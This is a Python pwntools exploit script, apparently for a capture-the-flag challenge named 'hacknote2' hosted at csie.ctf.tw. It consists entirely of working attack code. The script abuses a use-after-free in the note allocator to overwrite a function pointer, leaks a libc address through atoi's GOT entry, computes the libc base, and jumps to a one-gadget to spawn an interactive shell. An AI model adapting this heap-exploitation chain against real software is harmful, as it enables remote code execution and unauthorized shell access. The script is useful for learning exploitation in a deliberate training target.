#!/usr/bin/env python

from pwn import *

r = remote("csie.ctf.tw", 10139)
# r = process('./hacknote2', env = {"LD_PRELOAD": os.path.join(os.getcwd(), "libc.so.6")})

def add_note(sz, data):
    r.sendafter(':', '1')
    r.sendafter(':', str(sz))
    r.sendafter(':', str(data))

def del_note(idx):
    r.sendafter(':', '2')
    r.sendafter(':', str(idx))

def print_note(idx):
    r.sendafter(':', '3')
    r.sendafter(':', str(idx) + '\n')

#raw_input('#')

print_addr = 0x400886
atoi_got = 0x602068

add_note(40, 'lala')
add_note(40, 'gaga')
del_note(0)
del_note(1)
add_note(16, p64(print_addr) + p64(atoi_got))
print_note(0)
libc = u64(r.recvline()[:-1].ljust(8, '\x00')) - 0x36e80
log.info('libc base address: {}'.format(hex(libc)))
del_note(2)

add_note(80, 'aaaa')
del_note(3)
add_note(16, p64(libc + 0xf1117))
print_note(0)

r.interactive()
